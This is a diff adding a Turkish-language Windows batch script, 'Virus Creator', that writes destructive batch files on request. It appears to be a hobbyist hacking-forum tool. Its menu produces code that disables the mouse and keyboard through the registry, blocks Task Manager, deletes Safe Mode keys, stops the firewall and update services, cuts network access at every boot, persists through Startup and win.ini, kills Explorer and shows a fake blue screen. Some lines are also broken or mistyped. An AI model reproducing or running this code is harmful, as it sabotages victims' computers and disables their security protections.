@@ -1,0 +1,467 @@
+@echo off
+:bas
+cls
+echo Virus Creator 1.2.1'e Hosgeldiniz ---) MuhammedTr768
+echo Bu program kodlama gibi seyleri ogrenmeniz amaci ile yapilmistir
+echo Ilerlemek icin herhangi bir tusa basin
+echo cikabilecek sorunlardan biz sorumlu degiliz !!!
+pause >nul
+echo Yapmak istediginizin rakamini yaziniz
+echo 1 Virus Olustur
+echo 2 Olusturdugum Viruse Yeni Ozellikleri Ekleme
+set yetmisalti=nothing
+set/p yetmisalti=Sec:
+if %yetmisalti%==1 goto altiyetmis
+if %yetmisalti%==2 goto ozeklele
+:hgtac
+cls
+echo Ne dedigini anlayamadim ?! lutfen tekrar dene
+pause >nul
+goto bas
+:ozeklele
+cls
+echo Virus olusturdugunuzda virusun adini girdiginiz zaman
+echo yeni bir virus olusturmus olursunuz ve o ad kismina
+echo onceden olusturdugunuz virusun adini girerseniz o
+echo ozellik o viruste olur boylelikle istediginiz
+echo ozelligi virusunuze girebilirsiniz.
+pause >nul
+goto bas
+:altiyetmis
+echo hangisini olusturmak istiyorsaniz onun rakamini yazin
+echo (.bat kodlari)
+echo 1- Kendini Imha Etme 
+echo 2- Fare Kullanilmaz Hale Getirme
+echo 3- Bilgisayari Cildirtma 
+echo 4- dosyayi baslangicta calistirma
+echo 5- Dosyayi actiginda gizleme
+echo 6- Bilgisayar asla kapanmaz
+echo 7- Herhangi bir web sitesine giris engelle
+echo 8- Herhangi bir web sitesi ac
+echo 9- Gorev Yoneticisi bir daha acilmaz
+echo 10- Sistem dosyasi yap
+echo 11- win.ini nin icine koy
+echo 12- Kullanici giris panelini kapat
+echo 13- Explorer Kapat
+echo 14- Guvenli Modu Devre Disi Birak
+echo 15- Interneti Kokten Kes
+echo 16- Guvenlik Duvarini Cokert
+echo 17- Cdrom cildirt
+echo 18- Capslock cildirt
+echo 19- Basa gel
+echo 20- Bilgisayarin ekraninda mesaj olusturma
+echo 21- Fake mavi ekran olusturma
+echo 22- Cdrom delirtme
+echo 23- Saat ve tarihi farkli yapma
+echo 24- Klavyeyi devre disi birakma
+set/p bvkkod=Sec:
+if %bvkkod%==1 goto kiek
+if %bvkkod%==2 goto fkhg
+if %bvkkod%==3 goto bck
+if %bvkkod%==4 goto dbc
+if %bvkkod%==5 goto dagdaggo
+if %bvkkod%==6 goto bakla
+if %bvkkod%==7 goto hbwsge
+if %bvkkod%==8 goto hbwsa
+if %bvkkod%==9 goto gybda
+if %bvkkod%==10 goto sdelete
+if %bvkkod%==11 goto winini
+if %bvkkod%==12 goto kulgir
+if %bvkkod%==13 goto explorer
+if %bvkkod%==14 goto guvmod
+if %bvkkod%==15 goto intkok
+if %bvkkod%==16 goto guvduv
+if %bvkkod%==17 goto cdrom
+if %bvkkod%==18 goto ggpc
+if %bvkkod%==19 goto bas
+if %bvkkod%==20 goto bemo
+if %bvkkod%==21 goto fmeo
+if %bvkkod%==22 goto cdrom
+if %bvkkod%==23 goto svtfy
+if %bvkkod%==24 goto kddb
+:hatahatahata
+echo Anlayamadim ? seni basa yonlelendiriyorum
+echo Herhangi bir tusa bas
+pause >nul
+:bemo
+echo Bilgisayarin ekraninda olusturmak istediginiz mesaj nedir ?
+set nokta=nothing
+set/p nokta=sec:
+echo Olusturmak istediginiz veya eklemek istediginiz dosyanin adi nedir ? (uzantisiz)
+set bemoing=nothing
+set/p bemoing=Yaz:
+echo Yapiliyor...
+echo msg * %nokta% >> "%bemoing%.bat
+echo Basariyla olusturulmustur.
+start chrome turkhackteam.org
+cls
+goto bas
+:svtfy
+echo Ad girin
+set/p svt=Gir:
+echo Olusturuluyor...
+echo @echo off >> "%svt%.bat"
+echo rem --------------------------------- >> "%svt%.bat"
+echo rem Tarih zaman degistir.. >> "%svt%.bat"
+echo date 01/01/2000 >> "%svt%.bat"
+echo time 08:00 >> "%svt%.bat"
+echo rem --------------------------------- >> "%svt%.bat"
+echo Basariyla olusturulmustur.
+start chrome turkhackteam.org
+cls
+goto bas
+:kddb
+echo Ad girin
+set/p adgirn=Gir:
+echo @echo off >> "%adgirn%.bat"
+echo rem --------------------------------- >> "%adgirn%.bat"
+echo rem Klavye devre disi etme >> "%adgirn%.bat"
+echo echo Windows Registry Editor Version 5.00 >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "klavyekapa.reg" >> "%adgirn%.bat"
+echo start "klavyekapa.reg" >> "%adgirn%.bat"
+echo rem --------------------------------- >> "%adgirn%.bat"
+echo Basariyla olusturulmustur.
+start chrome turkhackteam.org
+cls
+goto bas
+:fmeo
+echo Bir ad girin (uzanti olmadan)
+set/p fmeolar=Gir:
+echo Yapiliyor...
+echo @echo off >> "%fmeolar%.bat"
+echo echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<hta:application id="oBVC" >> bsod.hta >> "%fmeolar%.bat"
+echo echo applicationname="BSOD"  >> bsod.hta "%fmeolar%.bat"
+echo echo version="1.0" >> bsod.hta >> "%fmeolar%.bat"
+echo echo maximizebutton="no" >> bsod.hta >> "%fmeolar%.bat"
+echo echo minimizebutton="no" >> bsod.hta >> "%fmeolar%.bat"
+echo echo sysmenu="no" >> bsod.hta >> "%fmeolar%.bat"
+echo echo Caption="no" >> bsod.hta >> "%fmeolar%.bat"
+echo echo windowstate="maximize"/^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>Technical information:^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo. >> bsod.hta
+echo echo. >> bsod.hta
+echo echo ^</font^> >> bsod.hta >> "%fmeolar%.bat"
+echo echo ^</body^>^</html^> >> bsod.hta >> "%fmeolar%.bat"
+echo start "" /wait "bsod.hta" >> "%fmeolar.bat"
+echo del /s /f /q "bsod.hta" > nul >> "%fmeolar%.bat"
+echo Basariyla Olusturulmustur.
+start chrome turkhackteam.org
+cls
+goto bas
+:cdrom
+echo Bir ad girin (uzantisiz)
+set/p cdroms=Gir:
+echo Olusturuluyor...
+echo echo Do >> "diskac.vbs" >> "%cdroms%.bat"
+echo echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "diskac.vbs" >> "%cdroms%.bat"
+echo echo Set colCDROMs = oWMP.cdromCollection >> "diskac.vbs" >> "%cdroms%.bat"
+echo echo colCDROMs.Item(d).Eject  >> "diskac.vbs" >> "%cdroms%.bat"
+echo echo colCDROMs.Item(d).Eject  >> "diskac.vbs" >> "%cdroms%.bat"
+echo echo Loop >> "diskac.vbs" >> "%cdroms%.bat"
+echo start "" "diskac.vbs" >> "%cdroms%.bat"
+echo diskac.vbs >> "%cdroms%.bat"
+echo Basariyla olusturulmustur
+start chrome turkhackteam.org
+cls
+goto bas
+:
+:kiek
+echo Virus olusturulacak ama dosyanin adini girin
+set/p kieking=Ad:
+echo Virus olusturuluyor...
+echo UYARI: islem bitene kadar bir yere ayrilmayin
+ping loaclhost -n 2 >nul
+cd Desktop
+echo @echo off >> "%kieking%.bat"
+echo del/f/q%0 >> "%kieking%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:fkhg
+echo Virus olusturulacak ama dosyanin adini girin
+set/p fkhging=Ad:
+echo Virus olusturuluyor...
+echo Uyari: islem bitene kadar bir yere ayrilmayin
+ping localhost -n 2 >nul
+cd Desktop
+echo @echo off >> "%fkhging%.bat"
+echo rem --------------------------------- >> "%fkhging%.bat"
+echo rem Fare Devre disi birakma >> "%fkhging%.bat
+echo set fare="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass" >> "%fkhging%.bat"
+echo reg delete %fare% >> "%fkhging%.bat"
+echo reg add %fare% /v Start /t REG_DWORD /d 4 >> "%fkhging%.bat"
+echo rem --------------------------------- >> "%fkhging%.bat"
+echo virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:bck
+echo Virus olusturulacak ama dosyanin adini girin
+set/p bcking=Ad:
+echo Virus olusturuluyor...
+echo UYARI: Islem bitene kadar bir yere ayrilmayin
+ping localhost -n 2 >nul
+cd Desktop
+echo /timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand(1,99999) $+ $rand(A,Z) $+ $rand(a,z) >> "%bcking%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:dbc
+echo Virus olusturulacak ama dosyanin adini girin
+set/p dbcing=Ad:
+echo Virus olusturuluyor...
+echo UYARI: Islem bitene kadar ayrilmayin
+ping localhost -n 2 >nul
+cd Desktop
+echo copy %0 "%userprofile%\..\All Users\Start Menu\Programs\Startup" >> "%dbcing%.bat"
+echo virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:dagdaggo
+echo Virus olusturulacak ama dosyanin adini girin
+set/p dagdaggoing=Ad:
+echo Virus olusturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo attrib +h %0 >> "%dagdaggoing%.bat"
+echo Virus olusturuldu :D
+start chrome turkhackteam.org
+cls
+goto bas
+:bakla
+echo Virus olusturulacak ama dosyanin adini girin
+set/p baklaing=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoClose /t REG_DWORD /d >> "%baklaing%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:hbwsge
+echo Virus olusturulacak ama dosyanin adini girin
+set/p hbwsgeing=Ad:
+echo Hangi web sitesine girisi engellemesini istiyorsunuz ?
+echo Uzantisiyla birlikte yazin
+set/p cvplala=Cevapla:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo cd "%systemroot%\System32\Drivers\etc" >> "%hbwsgeing%.bat"
+echo 127.0.0.1 %cvplala% >> "Hosts" >> "%hbwsgeing%.bat"
+echo 127.0.0.1 %cvplala% >> "Hosts" >> "%hbwsgeing%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:hbwsa
+echo Virus olusturulacak ama dosyanin adini girin
+set/p hbwsaing=Ad:
+echo Hangi web sitesine girilmesini istiyorsunuz ?
+echo Uzantisiyla birlikte yazin
+echo NOT: Google sadece olur
+set/p cvplala2=Cevapla:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo start chrome %cvplala2% >> "%hbwsaing%.bat"
+echo Virus olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:gybda
+echo Virus olusturulacak ama dosyanin adini girin
+set/p gybdaing=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul >> "%gybdaing%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:sdelete
+echo Virus olusturulacak ama dosyanin adini girin
+set/p sdeleteing=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo attrib +s %0 >> "%sdeleteing%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:winini
+echo Virus olusturulacak ama dosyanin adini girin
+set/p wining=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo copy %0 %systemroot%\system32\%0 >> "%wining%.bat"
+echo echo [windows] >> %systemroot%\win.ini >> "%wining%.bat"
+echo echo load=%systemroot%\system32\%0 >> %systemroot%\win.ini >> "%wining%.bat"
+echo echo run=%systemroot%\system32\%0 >> %systemroot%\win.ini >> "%wining%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:kulgir
+echo Virus olusturulacak ama dosyanin adini girin
+set/p kulgiring=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo set lol=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer >> "%kulgiring%.bat"
+echo Set val=NoUserNameInStartMenu >> "%kulgiring%.bat"
+echo Set date=1 >> "%kulgiring%.bat"
+echo reg.exe add "%lol%" /v "%val%" /d "%date%" /f >nul >> "%kulgiring%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:explorer
+echo Virus olusturulacak ama dosyanin adini girin
+set/p exploring=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 1 >nul
+cd Desktop
+echo TASKKILL -f -im explorer.exe >> "%exploring%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:guvmod
+echo Virus olusturulacak ama dosyanin adini girin
+set/p guvenis=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo reg delete HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal/f > nul >> "%guvenis%.bat"
+echo reg delete HKLM\SYSTEM\currentcontrolset\control\safeboot\network/f > nul >> "%guvenis%.bat"
+echo virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:intkok
+echo Virus olusturulacak ama dosyanin adini girin
+set/p ininang=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo echo @echo off>c:\windows\wimn32.bat >> "%ininang%.bat"
+echo echo break off>>c:\windows\wimn32.bat >> "%ininang%.bat"
+echo echo ipconfig/release_all>>c:\windows\wimn32.bat >> "%ininang%.bat"
+echo echo end>>c:\windows\wimn32.bat >> "%ininang%.bat"
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f >> "%ininang%.bat"
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f >> "%ininang%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:guvduv
+echo Virus olusturulacak ama dosyanin adini girin
+set/p guvinduv=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo net stop "Security Center" >> "%guvinduv%.bat"
+echo net stop SharedAcces >> "%guvinduv%.bat"
+echo > "%Temp%.\kill.reg" ECHO A R E S >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO. >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\SharedAccess] >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004 >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO. >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\wuauserv] >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004 >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO. >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\w scsvc] >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004 >> "%guvinduv%.bat"
+echo >>"%Temp%.\kill.reg" ECHO. >> "%guvinduv%.bat"
+echo START /WAIT REGEDIT /S "%Temp%.\kill.reg" >> "%guvinduv%.bat"
+echo DEL "%Temp%.\kill.reg" "%guvinduv%.bat"
+echo DEL %0 >> "%guvinduv%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:cdrom
+echo Virus olusturulacak ama dosyanin adini girin
+set/p cdcd=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo echo Do >> "diskac.vbs" >> "%cdcd%.bat"
+echo echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "diskac.vbs" >> "%cdcd%.bat"
+echo echo Set colCDROMs = oWMP.cdromCollection >> "diskac.vbs" >> "%cdcd%.bat"
+echo echo colCDROMs.Item(d).Eject  >> "diskac.vbs" >> "%cdcd%.bat"
+echo echo colCDROMs.Item(d).Eject  >> "diskac.vbs" >> "%cdcd%.bat"
+echo echo Loop >> "diskac.vbs" >> "%cdcd%.bat"
+echo start "" "diskac.vbs" >> "%cdcd%.bat"
+echo diskac.vbs >> "%cdcd%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
+:ggpc
+echo Virus olusturulacak ama dosyanin adini girin
+set/p englisk=Ad:
+echo Virus olsuturuluyor...
+ping localhost -n 2 >nul
+cd Desktop
+echo echo Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs >> "%englisk%.bat"
+echo echo do >>sendkey.vbs >> "%englisk%.bat"
+echo echo wscript.sleep 100 >>sendkey.vbs >> "%englisk%.bat"
+echo echo wshshell.sendkeys “{CAPSLOCK}” >>sendkey.vbs >> "%englisk%.bat"
+echo echo loop >>sendkey.vbs >> "%englisk%.bat"
+echo sendkey.vbs >> "%englisk%.bat"
+echo Virus basariyla olusturulmustur :D
+start chrome turkhackteam.org
+cls
+goto bas
